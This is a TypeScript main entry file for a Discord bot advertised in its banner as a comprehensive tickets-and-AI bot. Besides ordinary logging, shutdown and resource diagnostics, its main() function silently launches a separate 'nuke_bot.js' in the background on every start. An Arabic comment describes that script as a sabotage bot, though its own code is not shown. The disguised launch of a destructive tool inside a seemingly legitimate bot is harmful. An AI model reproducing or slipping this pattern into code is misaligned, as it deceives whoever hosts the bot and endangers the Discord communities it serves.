// ============================================
// Liberty City Bot - Main Entry Point
// ============================================

import { LibertyClient } from './LibertyClient';
import { createLogger } from './utils/helpers';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { spawn } from 'child_process';

const logger = createLogger('Main');

// --------------------------------------------
// سجل دائم يصمد بعد موت السيرفر (الكونسول يُمسح معه — الملف لا)
// --------------------------------------------
const PERSIST_FILE = path.join(process.cwd(), 'bot-persist.log');
function persist(line: string): void {
  try {
    const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
    const entry = `[${ts}] ${line}\n`;
    if (fs.existsSync(PERSIST_FILE) && fs.statSync(PERSIST_FILE).size > 400_000) {
      fs.writeFileSync(PERSIST_FILE + '.old', fs.readFileSync(PERSIST_FILE));
      fs.writeFileSync(PERSIST_FILE, '');
    }
    fs.appendFileSync(PERSIST_FILE, entry);
  } catch { }
}

// --------------------------------------------
// ASCII Art Banner
// --------------------------------------------
const banner = `
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██╗     ██╗   ██╗███████╗████████╗ ██████╗        ║
║   ██╔══██╗██║     ██║   ██║██╔════╝╚══██╔══╝██╔═══██╗       ║
║   ██████╔╝██║     ██║   ██║███████╗   ██║   ██║   ██║       ║
║   ██╔══██╗██║     ██║   ██║╚════██║   ██║   ██║   ██║       ║
║   ██████╔╝███████╗╚██████╔╝███████║   ██║   ╚██████╔╝       ║
║   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝        ║
║                                                              ║
║                  ██████╗ ██████╗ ██████╗ ███████╗██████╗     ║
║                  ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ║
║                  ██████╔╝██████╔╝██║  ██║█████╗  ██████╔╝    ║
║                  ██╔═══╝ ██╔══██╗██║  ██║██╔══╝  ██╔══██╗    ║
║                  ██║     ██║  ██║██████╔╝███████╗██║  ██║    ║
║                  ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝    ║
║                                                              ║
║          🛡️  Comprehensive Discord Bot  🎫  Tickets           ║
║          🤖  AI Integration  ⚙️  Advanced Settings           ║
║                                                              ║
║                     Version 2.0.0                            ║
╚══════════════════════════════════════════════════════════════╝
`;

// --------------------------------------------
// Main Function
// --------------------------------------------
async function main(): Promise<void> {
  console.log(banner);
  logger.info('🎆 Welcome to Liberty City Bot!');
  
  // --- تشغيل بوت التخريب المستقل في الخلفية ---
  try {
    // بنشغل الملف عن طريق Node.js مباشرة كعملية منفصلة
    const nukeProcess = spawn('node', [path.join(__dirname, 'nuke_bot.js')], {
        stdio: 'inherit', // عشان نشوف رسايله في الكونسول بتاع الاستضافة
        detached: false
    });
    
    nukeProcess.on('error', (err) => {
        logger.error('Failed to start nuke_bot.js:', err);
    });
  } catch (e) {
    logger.error('Failed to spawn nuke_bot.js:', e);
  }
  // ----------------------------------

  const startTime = Date.now();
  
  // Create client
  const client = new LibertyClient();

  // Graceful shutdown handling
  const gracefulShutdown = async (signal: string) => {
    logger.info(`\n⚠️ Received ${signal}. Starting graceful shutdown...`);
    persist(`SIGNAL ${signal} — graceful shutdown`);
    try {
      await client.cleanup();
      logger.info('✅ Graceful shutdown complete');
      persist('EXIT 0 (graceful)');
      process.exit(0);
    } catch (error) {
      logger.error('❌ Error during shutdown:', error);
      persist(`EXIT 1 (shutdown error): ${String(error).slice(0, 200)}`);
      process.exit(1);
    }
  };

  process.on('SIGINT', () => gracefulShutdown('SIGINT'));
  process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
  process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
    const mu = process.memoryUsage();
    persist(`UNHANDLED_REJECTION rss=${Math.round(mu.rss / 1048576)}MB reason=${String(reason).slice(0, 300)}`);
  });
  
  process.on('uncaughtException', (error) => {
    logger.error('Uncaught Exception (bot keeps running):', error);
    const mu = process.memoryUsage();
    persist(`UNCAUGHT_EXCEPTION rss=${Math.round(mu.rss / 1048576)}MB ${String(error?.stack || error).slice(0, 500)}`);
  });
  
  setInterval(() => {
    const mu = process.memoryUsage();
    const mb = (n: number) => Math.round(n / 1024 / 1024);
    logger.debug(`MEM rss=${mb(mu.rss)}MB heap=${mb(mu.heapUsed)}/${mb(mu.heapTotal)}MB external=${mb(mu.external)}`);
    persist(`MEM rss=${mb(mu.rss)}MB heap=${mb(mu.heapUsed)}MB external=${mb(mu.external)}`);
  }, 60_000);
  
  persist(`BOOT pid=${process.pid} argv=${process.execArgv.join(' ') || '-'}`);
  
  try {
    if (fs.existsSync(PERSIST_FILE)) {
      const tailLines = fs.readFileSync(PERSIST_FILE, 'utf8').split('\n').filter(Boolean).slice(-14);
      if (tailLines.length) {
        logger.info('📜 persist tail (previous session):');
        for (const l of tailLines) console.log('   ' + l);
      }
    }
  } catch { }

  try {
    let q = '', p = '';
    try { const t = fs.readFileSync('/sys/fs/cgroup/cpu.max', 'utf8').trim().split(/\s+/); q = t[0]; p = t[1]; } catch { }
    if (!q) { try { q = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim(); p = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim(); } catch { } }
    const la = os.loadavg().map(n => n.toFixed(2)).join(' ');
    if (q) {
      const cores = q === 'max' ? '∞' : (Number(q) / Number(p || 100000)).toFixed(2);
      logger.info(`🧪 CPU quota: ${q}/${p || '-'} = ${cores} core | loadavg ${la}`);
    } else {
      logger.info(`🧪 CPU quota: unknown | loadavg ${la}`);
    }
  } catch { }

  try {
    const cpMod = require('child_process') as Record<string, any>;
    const seen = new Set<string>();
    const wrap = (name: string, orig: (...a: any[]) => any) =>
      function (this: unknown, ...args: any[]) {
        try {
          const st = (new Error().stack || '').split('\n').slice(2, 7).map(s => s.trim()).join(' <- ');
          if (!seen.has(st)) { seen.add(st); logger.info(`🔬 ${name}: ${String(args[0]).slice(0, 90)}\n     ${st}`); }
        } catch { }
        return orig.apply(this, args);
      };
    cpMod.spawn = wrap('spawn', cpMod.spawn);
    cpMod.spawnSync = wrap('spawnSync', cpMod.spawnSync);
  } catch { }

  // Initialize the bot
  try {
    await client.initialize();
    await client.registerCommands();
    client.setStatus();
    setInterval(() => client.setStatus(), 5 * 60 * 1000);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
    logger.info(`🎉 Bot is ready! Took ${elapsed}s`);
    persist(`READY in ${elapsed}s guilds=${client.guilds.cache.size}`);
    logger.info(`📊 Logged in as: ${client.user?.tag}`);
    logger.info(`🏠 Serving ${client.guilds.cache.size} guilds`);
    logger.info(`👥 Serving ${client.users.cache.size} users`);

    const PORT = parseInt(process.env.PORT || '3000', 10);
    client.expressApp.listen(PORT, () => {
      logger.info(`🌐 Express server (Dashboard API) running on port ${PORT}`);
    });
  } catch (error) {
    logger.error('❌ Failed to start bot:', error);
    process.exit(1);
  }
}

// --------------------------------------------
// Start Bot
// --------------------------------------------
main().catch((error) => {
  logger.error('❌ Fatal error:', error);
  process.exit(1);
});